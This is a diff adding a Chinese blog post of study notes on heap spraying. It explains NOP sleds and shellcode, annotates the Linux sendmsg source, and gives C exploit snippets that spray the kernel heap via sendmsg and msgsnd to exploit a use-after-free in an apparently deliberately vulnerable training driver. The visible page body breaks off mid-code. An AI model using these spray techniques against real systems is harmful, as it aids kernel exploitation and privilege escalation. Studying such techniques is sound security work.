@@ -1,0 +1,532 @@
+
+<!DOCTYPE html>
+<html lang="zh-Hans">
+    
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="generator" content="Edvison&#39;s blog">
+    <title>堆喷射 - Edvison&#39;s blog</title>
+    <meta name="author" content="Edvison">
+    
+    
+        <link rel="icon" href="http://edvison.cn/assets/images/favicon.ico">
+    
+    
+        <link rel="alternate" type="application/atom+xml" title="RSS" href="/atom.xml">
+    
+    <script type="application/ld+json">{"@context":"http://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"Edvison","sameAs":["https://github.com/edvison","mailto:edvisonmail@163.com"],"image":"1.png"},"articleBody":"\n\nhttp://blog.csdn.net/magictong/article/details/7391397\n堆喷射（Heap Spray）定义Heap Spray是在shellcode的前面加上大量的slide code（滑板指令），组成一个注入代码段。然后向系统申请大量内存，并且反复用注入代码段来填充。这样就使得进程的地址空间被大量的注入代码所占据。然后结合其他的漏洞攻击技术控制程序流，使得程序执行到堆上，最终让shellcode成功执行。\n传统slide code（滑板指令）一般是NOP指令，但是随着一些新的攻击技术的出现，逐渐开始使用更多的类NOP指令，譬如0x0C（0x0C0C代表的x86指令是OR AL 0x0C），0x0D等等，不管是NOP还是0C，他们的共同特点就是不会影响shellcode的执行。使用slide code的原因下面还会详细讲到。\nHeap Spray只是一种辅助技术，需要结合其他的栈溢出或堆溢出等等各种溢出技术才能发挥作用。\n堆喷射原理虚拟内存结构进程的4GB内存空间被人为的分为两个部分–用户空间与内核空间。用户空间地址分布从0到3GB(PAGE_OFFSET，在0x86中它等于0xC0000000)，3GB到4GB为内核空间。 \n从本质上来说，虚拟内存模型为每个运行中的进程提供了它自己的4GB虚拟地址空间。这项工作是通过一个从虚拟地址到物理地址的转换来完成的，并且是在一个内存管理单元（Memory Management Unit，MMU）的帮助下完成的。\n内核空间中，从3G到vmalloc_start这段地址是物理内存映射区域（该区域中包含了内核镜像、物理页框表mem_map等等）。在物理内存映射区之后，就是vmalloc区域。对于 160M的系统而言，vmalloc_start位置应在3G+160M附近（在物理内存映射区与vmalloc_start期间还存在一个8M的gap 来防止跃界），vmalloc_end的位置接近4G(最后位置系统会保留一片128k大小的区域用于专用页面映射)\n在用户空间，各个类型数据在内存地址的分布大概为：栈 - 堆 – 全局静态数据 &amp; 常量数据（低地址到高地址），其中全局静态数据和常量数量都是在操作系统加载应用程序时直接映射到内存的。\n堆布局slide code为什么要在shellcode前面加上slide code呢？其实很简单，想要shellcode执行成功，必须要准确地命中shellcode的第一个字符，而直接将shellcode填充整个进程空间反而更难命中了。现在加上slide code就可以保证只要命中slide code那么就一定能成功执行shellcode。一般shellcode的指令的总长度在50个字节左右，而slidecode的长度则大约是100万字节（按每块分配1M计算）这样成功的几率就大了很多。\nhttps://invictus-security.blog/2017/06/15/linux-kernel-heap-spraying-uaf/  \nsendmsg堆喷射在这里可以查看sendmsg系统调用原型：12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061  static int ___sys_sendmsg(struct socket *sock, struct user_msghdr __user *msg,                struct msghdr *msg_sys, unsigned int flags,                struct used_address *used_address,                unsigned int allowed_msghdr_flags)&#123;    struct compat_msghdr __user *msg_compat =        (struct compat_msghdr __user *)msg;    struct sockaddr_storage address;    struct iovec iovstack[UIO_FASTIOV], *iov = iovstack;    unsigned char ctl[sizeof(struct cmsghdr) + 20]                __aligned(sizeof(__kernel_size_t));   //分配了一个名为ctl的44字节堆栈缓冲区    /* 20 is size of ipv6_pktinfo */    unsigned char *ctl_buf = ctl;    int ctl_len;    ssize_t err;    msg_sys-&gt;msg_name = &amp;address;    if (MSG_CMSG_COMPAT &amp; flags)        err = get_compat_msghdr(msg_sys, msg_compat, NULL, &amp;iov);    else        err = copy_msghdr_from_user(msg_sys, msg, NULL, &amp;iov);  //user_msghdr被复制到内核空间的msghdr中，现在msg_sys包含用户提供的数据    if (err &lt; 0)        return err;    err = -ENOBUFS;    if (msg_sys-&gt;msg_controllen &gt; INT_MAX)  //检查msg_sys是否大于INT_MAX，如果小于那就把ctl_len分配给用户提供的contorllen        goto out_freeiov;    flags |= (msg_sys-&gt;msg_flags &amp; allowed_msghdr_flags);    ctl_len = msg_sys-&gt;msg_controllen;    if ((MSG_CMSG_COMPAT &amp; flags) &amp;&amp; ctl_len) &#123;        err =            cmsghdr_from_user_compat_to_kern(msg_sys, sock-&gt;sk, ctl,                            sizeof(ctl));        if (err)            goto out_freeiov;        ctl_buf = msg_sys-&gt;msg_control;        ctl_len = msg_sys-&gt;msg_controllen;    &#125; else if (ctl_len) &#123;        BUILD_BUG_ON(sizeof(struct cmsghdr) !=                CMSG_ALIGN(sizeof(struct cmsghdr)));        if (ctl_len &gt; sizeof(ctl)) &#123;            ctl_buf = sock_kmalloc(sock-&gt;sk, ctl_len, GFP_KERNEL);  //如果我们的数据大于44字节（sizeof ctl），就调用sock_kmalloc()，最后调用kmalloc(size, flag)            if (ctl_buf == NULL)                goto out_freeiov;        &#125;        err = -EFAULT;        /*        * 注意! 在此之前, msg_sys-&gt;msg_control 包含一个用户指针.        * 之后，它将成为内核指针。        * 因此，编译器辅助的检查就落在了这个位置。        */        if (copy_from_user(ctl_buf,                  (void __user __force *)msg_sys-&gt;msg_control,                  ctl_len))            goto out_freectl;        msg_sys-&gt;msg_control = ctl_buf;  //msg_sys-&gt;msg_control中的数据被复制到ctl_buf中    &#125;    msg_sys-&gt;msg_flags = flags;...\n分析完代码，我们能总结出两个要点：\n\n控制kmalloc调用的大小，使它大于44\n控制被分配到堆中的数据\n\n利用代码：1234567891011121314151617181920212223242526272829303132333435363738394041424344454647/*** Here we are using the sendmsg syscall. This is a good* one to use because the number of bytes allocated on the* heap is determined by the user, this means we can determine* which cache to use. The api is quite confusing and much of this* was written after reading a lot of stackoverflow posts.*/void use_after_free_sendmsg(int fd, long target, long arg)&#123;    char buff[BUFF_SIZE];    struct msghdr msg = &#123;0&#125;;    struct sockaddr_in addr = &#123;0&#125;;    int sockfd = socket(AF_INET, SOCK_DGRAM, 0);    memset(buff, 0x43, sizeof buff);    memcpy(buff+56, &amp;arg, sizeof(long));    memcpy(buff+56+(sizeof(long)), &amp;target, sizeof(long));        addr.sin_addr.s_addr = htonl(INADDR_LOOPBACK);    addr.sin_family = AF_INET;    addr.sin_port = htons(6666);    /* 这是将覆盖堆中易受攻击对象的数据 */        msg.msg_control = buff;    /* 这是用户控制的大小，最终将调用kmalloc(msg_controllen) */        msg.msg_controllen = BUFF_SIZE; // 本来该是chdr-&gt;cmsg_len的，但是我想强制定义大小        msg.msg_name = (caddr_t)&amp;addr;        msg.msg_namelen = sizeof(addr);    ioctl(fd, ALLOC_UAF_OBJ, NULL);    ioctl(fd, FREE_UAF_OBJ, NULL);    /* Heap spray */    int i;    for(i = 0; i &lt; 100000; i++) &#123;                  sendmsg(sockfd, &amp;msg, 0);          &#125;    /* Trigger */    ioctl(fd, USE_UAF_OBJ, NULL);&#125;\nmsgsnd堆喷射下面的系统调用是magsnd，它更容易使用，但是有一些限制：1234567891011121314151617181920212223242526272829int use_after_free_msgsnd(int fd)&#123;    struct &#123;        long mtype;        char mtext[BUFF_SIZE];    &#125;msg;    memset(msg.mtext, 0x42, BUFF_SIZE-1);    msg.mtext[BUFF_SIZE] = 0;    /* 创建消息队列， 我们将通过这个发送消息 */    int msqid = msgget(IPC_PRIVATE, 0644 | IPC_CREAT);    /* mtype 必须大于0 */    msg.mtype = 1;    /* 分配和释放易受攻击的对象，并准备在相关缓存中进行覆盖 */    ioctl(fd, ALLOC_UAF_OBJ, NULL);        ioctl(fd, FREE_UAF_OBJ, NULL);    /* 喷射堆，msg越大，我们可以发送的信息量就越少 */    int i;    for(i = 0; i &lt; 120; i++)              msgsnd(msqid, &amp;msg, sizeof(msg.mtext), 0);      ioctl(fd, USE_UAF_OBJ, NULL);&#125;\n我们注意到调用这个函数时使用到的alloc_mag函数，我们可以在这里查看它是如何分配内存的：12345678910111213141516171819202122232425262728293031323334static struct msg_msg *alloc_msg(size_t len)&#123;    struct msg_msg *msg;    struct msg_msgseg **pseg;    size_t alen;    alen = min(len, DATALEN_MSG);    msg = kmalloc(sizeof(*msg) + alen, GFP_KERNEL_ACCOUNT);    if (msg == NULL)        return NULL;    msg-&gt;next = NULL;    msg-&gt;security = NULL;    len -= alen;    pseg = &amp;msg-&gt;next;    while (len &gt; 0) &#123;        struct msg_msgseg *seg;        alen = min(len, DATALEN_SEG);        seg = kmalloc(sizeof(*seg) + alen, GFP_KERNEL_ACCOUNT);        if (seg == NULL)            goto out_err;        *pseg = seg;        seg-&gt;next = NULL;        pseg = &amp;seg-&gt;next;        len -= alen;    &#125;    return msg;out_err:    free_msg(msg);    return NULL;&#125;\nmsg_msg结构的大小为48字节，我们不控制进入它的大小，因此，整体的kmalloc分配是48+我们的消息的大小。这意味着我们不能在32字节的cache中使用这种方法，并且它会与64字节的cache发生冲突。","dateCreated":"2018-07-25T18:19:56+08:00","dateModified":"2018-07-25T18:21:25+08:00","datePublished":"2018-07-25T18:19:56+08:00","description":"堆喷笔记","headline":"堆喷射","image":[],"mainEntityOfPage":{"@type":"WebPage","@id":"http://edvison.cn/2018/07/25/堆喷射/"},"publisher":{"@type":"Organization","name":"Edvison","sameAs":["https://github.com/edvison","mailto:edvisonmail@163.com"],"image":"1.png","logo":{"@type":"ImageObject","url":"1.png"}},"url":"http://edvison.cn/2018/07/25/堆喷射/","keywords":"pwn, linux, heap"}</script>
+    <meta name="description" content="堆喷笔记">
+<meta name="keywords" content="pwn,linux,heap">
+<meta property="og:type" content="blog">
+<meta property="og:title" content="堆喷射">
+<meta property="og:url" content="http://edvison.cn/2018/07/25/堆喷射/index.html">
+<meta property="og:site_name" content="Edvison&#39;s blog">
+<meta property="og:description" content="堆喷笔记">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:updated_time" content="2018-07-25T10:21:25.929Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="堆喷射">
+<meta name="twitter:description" content="堆喷笔记">
+    
+    
+        
+    
+    
+        <meta property="og:image" content="http://edvison.cn/assets/images/1.png"/>
+    
+    
+    
+    
+    <!--STYLES-->
+    <link rel="stylesheet" href="/assets/css/font-awesome.css">
+    <link rel="stylesheet" href="/assets/css/jquery.fancybox.css">
+    <link rel="stylesheet" href="/assets/css/thumbs.css">
+    <link rel="stylesheet" href="/assets/css/tranquilpeak.css">
+    <!--STYLES END-->
+    
+
+    
+</head>
+
+    <body>
+        <div id="blog">
+            <!-- Define author's picture -->
+
+
+    
+        
+            
+        
+    
+
+<header id="header" data-behavior="5">
+    <i id="btn-open-sidebar" class="fa fa-lg fa-bars"></i>
+    <div class="header-title">
+        <a class="header-title-link" href="/ ">Edvison&#39;s blog</a>
+    </div>
+    
+        
+            <a  class="header-right-picture "
+                href="#about">
+        
+        
+            <img class="header-picture" src="/assets/images/1.png" alt="Bild des Autors"/>
+        
+        </a>
+    
+</header>
+
+            <!-- Define author's picture -->
+
+
+
+        
+    
+
+<nav id="sidebar" data-behavior="5">
+    <div class="sidebar-container">
+        
+            <div class="sidebar-profile">
+                <a href="/#about">
+                    <img class="sidebar-profile-picture" src="/assets/images/1.png" alt="Bild des Autors"/>
+                </a>
+                <h4 class="sidebar-profile-name">Edvison</h4>
+                
+                    <h5 class="sidebar-profile-bio"><p>Just the way you are</p>
+</h5>
+                
+            </div>
+        
+        
+            <ul class="sidebar-buttons">
+            
+                <li class="sidebar-button">
+                    
+                        <a  class="sidebar-button-link "
+                             href="/ "
+                            
+                            title="Home"
+                        >
+                    
+                        <i class="sidebar-button-icon fa fa-lg fa-home" aria-hidden="true"></i>
+                        <span class="sidebar-button-desc">Home</span>
+                    </a>
+            </li>
+            
+                <li class="sidebar-button">
+                    
+                        <a  class="sidebar-button-link "
+                             href="/all-categories"
+                            
+                            title="categories"
+                        >
+                    
+                        <i class="sidebar-button-icon fa fa-lg fa-bookmark" aria-hidden="true"></i>
+                        <span class="sidebar-button-desc">categories</span>
+                    </a>
+            </li>
+            
+                <li class="sidebar-button">
+                    
+                        <a  class="sidebar-button-link "
+                             href="/all-tags"
+                            
+                            title="tags"
+                        >
+                    
+                        <i class="sidebar-button-icon fa fa-lg fa-tags" aria-hidden="true"></i>
+                        <span class="sidebar-button-desc">tags</span>
+                    </a>
+            </li>
+            
+                <li class="sidebar-button">
+                    
+                        <a  class="sidebar-button-link "
+                             href="/all-archives"
+                            
+                            title="archives"
+                        >
+                    
+                        <i class="sidebar-button-icon fa fa-lg fa-archive" aria-hidden="true"></i>
+                        <span class="sidebar-button-desc">archives</span>
+                    </a>
+            </li>
+            
+                <li class="sidebar-button">
+                    
+                        <a  class="sidebar-button-link open-algolia-search"
+                             href="#search"
+                            
+                            title="search"
+                        >
+                    
+                        <i class="sidebar-button-icon fa fa-lg fa-search" aria-hidden="true"></i>
+                        <span class="sidebar-button-desc">search</span>
+                    </a>
+            </li>
+            
+                <li class="sidebar-button">
+                    
+                        <a  class="sidebar-button-link "
+                             href="#about"
+                            
+                            title="about"
+                        >
+                    
+                        <i class="sidebar-button-icon fa fa-lg fa-question" aria-hidden="true"></i>
+                        <span class="sidebar-button-desc">about</span>
+                    </a>
+            </li>
+            
+        </ul>
+        
+            <ul class="sidebar-buttons">
+            
+                <li class="sidebar-button">
+                    
+                        <a  class="sidebar-button-link " href="https://github.com/edvison" target="_blank" rel="noopener" title="GitHub">
+                    
+                        <i class="sidebar-button-icon fa fa-lg fa-github" aria-hidden="true"></i>
+                        <span class="sidebar-button-desc">GitHub</span>
+                    </a>
+            </li>
+            
+                <li class="sidebar-button">
+                    
+                        <a  class="sidebar-button-link " href="mailto:edvisonmail@163.com" target="_blank" rel="noopener" title="E-Mail">
+                    
+                        <i class="sidebar-button-icon fa fa-lg fa-envelope-o" aria-hidden="true"></i>
+                        <span class="sidebar-button-desc">E-Mail</span>
+                    </a>
+            </li>
+            
+        </ul>
+        
+            <ul class="sidebar-buttons">
+            
+                <li class="sidebar-button">
+                    
+                        <a  class="sidebar-button-link "
+                             href="/atom.xml"
+                            
+                            title="RSS"
+                        >
+                    
+                        <i class="sidebar-button-icon fa fa-lg fa-rss" aria-hidden="true"></i>
+                        <span class="sidebar-button-desc">RSS</span>
+                    </a>
+            </li>
+            
+        </ul>
+        
+    </div>
+</nav>
+
+            
+            <div id="main" data-behavior="5"
+                 class="
+                        hasCoverMetaIn
+                        ">
+                
+<article class="post">
+    
+    
+        <div class="post-header main-content-wrap text-left">
+    
+        <h1 class="post-title">
+            堆喷射
+        </h1>
+    
+    
+        <div class="post-meta">
+    <time datetime="2018-07-25T18:19:56+08:00">
+	
+		    25 Jul 2018
+    	
+    </time>
+    
+        <span>in </span>
+        
+    <a class="category-link" href="/categories/kernel/">kernel</a>
+
+
+    
+</div>
+
+    
+</div>
+
+    
+    <div class="post-content markdown">
+        <div class="main-content-wrap">
+            <!-- excerpt --></p>
+<h1 id="table-of-contents">Inhaltsverzeichnis</h1><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#堆喷射（Heap-Spray）定义"><span class="toc-text">堆喷射（Heap Spray）定义</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#堆喷射原理"><span class="toc-text">堆喷射原理</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#虚拟内存结构"><span class="toc-text">虚拟内存结构</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#堆布局"><span class="toc-text">堆布局</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#slide-code"><span class="toc-text">slide code</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#sendmsg堆喷射"><span class="toc-text">sendmsg堆喷射</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#msgsnd堆喷射"><span class="toc-text">msgsnd堆喷射</span></a></li></ol>
+<p><a href="http://blog.csdn.net/magictong/article/details/7391397" target="_blank" rel="noopener">http://blog.csdn.net/magictong/article/details/7391397</a></p>
+<h2 id="堆喷射（Heap-Spray）定义"><a href="#堆喷射（Heap-Spray）定义" class="headerlink" title="堆喷射（Heap Spray）定义"></a>堆喷射（Heap Spray）定义</h2><p>Heap Spray是在shellcode的前面加上大量的slide code（滑板指令），组成一个注入代码段。然后向系统申请大量内存，并且反复用注入代码段来填充。这样就使得进程的地址空间被大量的注入代码所占据。然后结合其他的漏洞攻击技术控制程序流，使得程序执行到堆上，最终让shellcode成功执行。</p>
+<p>传统slide code（滑板指令）一般是NOP指令，但是随着一些新的攻击技术的出现，逐渐开始使用更多的类NOP指令，譬如0x0C（0x0C0C代表的x86指令是OR AL 0x0C），0x0D等等，不管是NOP还是0C，他们的共同特点就是不会影响shellcode的执行。使用slide code的原因下面还会详细讲到。</p>
+<p>Heap Spray只是一种辅助技术，需要结合其他的栈溢出或堆溢出等等各种溢出技术才能发挥作用。</p>
+<h2 id="堆喷射原理"><a href="#堆喷射原理" class="headerlink" title="堆喷射原理"></a>堆喷射原理</h2><h3 id="虚拟内存结构"><a href="#虚拟内存结构" class="headerlink" title="虚拟内存结构"></a>虚拟内存结构</h3><p>进程的4GB内存空间被人为的分为两个部分–用户空间与内核空间。用户空间地址分布从0到3GB(PAGE_OFFSET，在0x86中它等于0xC0000000)，3GB到4GB为内核空间。 </p>
+<p>从本质上来说，虚拟内存模型为每个运行中的进程提供了它自己的4GB虚拟地址空间。这项工作是通过一个从虚拟地址到物理地址的转换来完成的，并且是在一个内存管理单元（Memory Management Unit，MMU）的帮助下完成的。</p>
+<p>内核空间中，从3G到vmalloc_start这段地址是物理内存映射区域（该区域中包含了内核镜像、物理页框表mem_map等等）。在物理内存映射区之后，就是vmalloc区域。对于 160M的系统而言，vmalloc_start位置应在3G+160M附近（在物理内存映射区与vmalloc_start期间还存在一个8M的gap 来防止跃界），vmalloc_end的位置接近4G(最后位置系统会保留一片128k大小的区域用于专用页面映射)</p>
+<p>在用户空间，各个类型数据在内存地址的分布大概为：栈 - 堆 – 全局静态数据 &amp; 常量数据（低地址到高地址），其中全局静态数据和常量数量都是在操作系统加载应用程序时直接映射到内存的。</p>
+<h3 id="堆布局"><a href="#堆布局" class="headerlink" title="堆布局"></a>堆布局</h3><h3 id="slide-code"><a href="#slide-code" class="headerlink" title="slide code"></a>slide code</h3><p>为什么要在shellcode前面加上slide code呢？其实很简单，想要shellcode执行成功，必须要准确地命中shellcode的第一个字符，而直接将shellcode填充整个进程空间反而更难命中了。现在加上slide code就可以保证只要命中slide code那么就一定能成功执行shellcode。<br>一般shellcode的指令的总长度在50个字节左右，而slidecode的长度则大约是100万字节（按每块分配1M计算）这样成功的几率就大了很多。</p>
+<p><a href="https://invictus-security.blog/2017/06/15/linux-kernel-heap-spraying-uaf/" target="_blank" rel="noopener">https://invictus-security.blog/2017/06/15/linux-kernel-heap-spraying-uaf/</a>  </p>
+<h2 id="sendmsg堆喷射"><a href="#sendmsg堆喷射" class="headerlink" title="sendmsg堆喷射"></a>sendmsg堆喷射</h2><p>在<a href="https://elixir.bootlin.com/linux/latest/source/net/socket.c" target="_blank" rel="noopener">这里</a>可以查看sendmsg系统调用原型：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line">  <span class="keyword">static</span> <span class="keyword">int</span> ___sys_sendmsg(struct socket *sock, struct user_msghdr __user *msg,</span><br><span class="line">                struct msghdr *msg_sys, <span class="keyword">unsigned</span> <span class="keyword">int</span> flags,</span><br><span class="line">                struct used_address *used_address,</span><br><span class="line">                <span class="keyword">unsigned</span> <span class="keyword">int</span> allowed_msghdr_flags)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">compat_msghdr</span> __<span class="title">user</span> *<span class="title">msg_compat</span> =</span></span><br><span class="line"><span class="class">        (<span class="title">struct</span> <span class="title">compat_msghdr</span> __<span class="title">user</span> *)<span class="title">msg</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_storage</span> <span class="title">address</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">iovec</span> <span class="title">iovstack</span>[<span class="title">UIO_FASTIOV</span>], *<span class="title">iov</span> = <span class="title">iovstack</span>;</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> ctl[<span class="keyword">sizeof</span>(struct cmsghdr) + <span class="number">20</span>]</span><br><span class="line">                __aligned(<span class="keyword">sizeof</span>(<span class="keyword">__kernel_size_t</span>));   <span class="comment">//分配了一个名为ctl的44字节堆栈缓冲区</span></span><br><span class="line">    <span class="comment">/* 20 is size of ipv6_pktinfo */</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> *ctl_buf = ctl;</span><br><span class="line">    <span class="keyword">int</span> ctl_len;</span><br><span class="line">    <span class="keyword">ssize_t</span> err;</span><br><span class="line"></span><br><span class="line">    msg_sys-&gt;msg_name = &amp;address;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (MSG_CMSG_COMPAT &amp; flags)</span><br><span class="line">        err = get_compat_msghdr(msg_sys, msg_compat, <span class="literal">NULL</span>, &amp;iov);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        err = copy_msghdr_from_user(msg_sys, msg, <span class="literal">NULL</span>, &amp;iov);  <span class="comment">//user_msghdr被复制到内核空间的msghdr中，现在msg_sys包含用户提供的数据</span></span><br><span class="line">    <span class="keyword">if</span> (err &lt; <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">return</span> err;</span><br><span class="line"></span><br><span class="line">    err = -ENOBUFS;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (msg_sys-&gt;msg_controllen &gt; INT_MAX)  <span class="comment">//检查msg_sys是否大于INT_MAX，如果小于那就把ctl_len分配给用户提供的contorllen</span></span><br><span class="line">        <span class="keyword">goto</span> out_freeiov;</span><br><span class="line">    flags |= (msg_sys-&gt;msg_flags &amp; allowed_msghdr_flags);</span><br><span class="line">    ctl_len = msg_sys-&gt;msg_controllen;</span><br><span class="line">    <span class="keyword">if</span> ((MSG_CMSG_COMPAT &amp; flags) &amp;&amp; ctl_len) &#123;</span><br><span class="line">        err =</span><br><span class="line">            cmsghdr_from_user_compat_to_kern(msg_sys, sock-&gt;sk, ctl,</span><br><span class="line">                            <span class="keyword">sizeof</span>(ctl));</span><br><span class="line">        <span class="keyword">if</span> (err)</span><br><span class="line">            <span class="keyword">goto</span> out_freeiov;</span><br><span class="line">        ctl_buf = msg_sys-&gt;msg_control;</span><br><span class="line">        ctl_len = msg_sys-&gt;msg_controllen;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (ctl_len) &#123;</span><br><span class="line">        BUILD_BUG_ON(<span class="keyword">sizeof</span>(struct cmsghdr) !=</span><br><span class="line">                CMSG_ALIGN(<span class="keyword">sizeof</span>(struct cmsghdr)));</span><br><span class="line">        <span class="keyword">if</span> (ctl_len &gt; <span class="keyword">sizeof</span>(ctl)) &#123;</span><br><span class="line">            ctl_buf = sock_kmalloc(sock-&gt;sk, ctl_len, GFP_KERNEL);  <span class="comment">//如果我们的数据大于44字节（sizeof ctl），就调用sock_kmalloc()，最后调用kmalloc(size, flag)</span></span><br><span class="line">            <span class="keyword">if</span> (ctl_buf == <span class="literal">NULL</span>)</span><br><span class="line">                <span class="keyword">goto</span> out_freeiov;</span><br><span class="line">        &#125;</span><br><span class="line">        err = -EFAULT;</span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">        * 注意! 在此之前, msg_sys-&gt;msg_control 包含一个用户指针.</span></span><br><span class="line"><span class="comment">        * 之后，它将成为内核指针。</span></span><br><span class="line"><span class="comment">        * 因此，编译器辅助的检查就落在了这个位置。</span></span><br><span class="line"><span class="comment">        */</span></span><br><span class="line">        <span class="keyword">if</span> (copy_from_user(ctl_buf,</span><br><span class="line">                  (<span class="keyword">void</span> __user __force *)msg_sys-&gt;msg_control,</span><br><span class="line">                  ctl_len))</span><br><span class="line">            <span class="keyword">goto</span> out_freectl;</span><br><span class="line">        msg_sys-&gt;msg_control = ctl_buf;  <span class="comment">//msg_sys-&gt;msg_control中的数据被复制到ctl_buf中</span></span><br><span class="line">    &#125;</span><br><span class="line">    msg_sys-&gt;msg_flags = flags;</span><br><span class="line">...</span><br></pre></td></tr></table></figure></p>
+<p>分析完代码，我们能总结出两个要点：</p>
+<ul>
+<li>控制kmalloc调用的大小，使它大于44</li>
+<li>控制被分配到堆中的数据</li>
+</ul>
+<p>利用<a href="https://github.com/invictus-0x90/vulnerable_linux_driver" target="_blank" rel="noopener">代码</a>：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">* Here we are using the sendmsg syscall. This is a good</span></span><br><span class="line"><span class="comment">* one to use because the number of bytes allocated on the</span></span><br><span class="line"><span class="comment">* heap is determined by the user, this means we can determine</span></span><br><span class="line"><span class="comment">* which cache to use. The api is quite confusing and much of this</span></span><br><span class="line"><span class="comment">* was written after reading a lot of stackoverflow posts.</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">use_after_free_sendmsg</span><span class="params">(<span class="keyword">int</span> fd, <span class="keyword">long</span> target, <span class="keyword">long</span> arg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> buff[BUFF_SIZE];</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">msghdr</span> <span class="title">msg</span> = &#123;</span><span class="number">0</span>&#125;;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">addr</span> = &#123;</span><span class="number">0</span>&#125;;</span><br><span class="line">    <span class="keyword">int</span> sockfd = socket(AF_INET, SOCK_DGRAM, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memset</span>(buff, <span class="number">0x43</span>, <span class="keyword">sizeof</span> buff);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memcpy</span>(buff+<span class="number">56</span>, &amp;arg, <span class="keyword">sizeof</span>(<span class="keyword">long</span>));</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memcpy</span>(buff+<span class="number">56</span>+(<span class="keyword">sizeof</span>(<span class="keyword">long</span>)), &amp;target, <span class="keyword">sizeof</span>(<span class="keyword">long</span>));</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">    addr.sin_addr.s_addr = htonl(INADDR_LOOPBACK);</span><br><span class="line">    addr.sin_family = AF_INET;</span><br><span class="line">    addr.sin_port = htons(<span class="number">6666</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* 这是将覆盖堆中易受攻击对象的数据 */</span></span><br><span class="line">        msg.msg_control = buff;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* 这是用户控制的大小，最终将调用kmalloc(msg_controllen) */</span></span><br><span class="line">        msg.msg_controllen = BUFF_SIZE; <span class="comment">// 本来该是chdr-&gt;cmsg_len的，但是我想强制定义大小</span></span><br><span class="line"></span><br><span class="line">        msg.msg_name = (<span class="keyword">caddr_t</span>)&amp;addr;</span><br><span class="line">        msg.msg_namelen = <span class="keyword">sizeof</span>(addr);</span><br><span 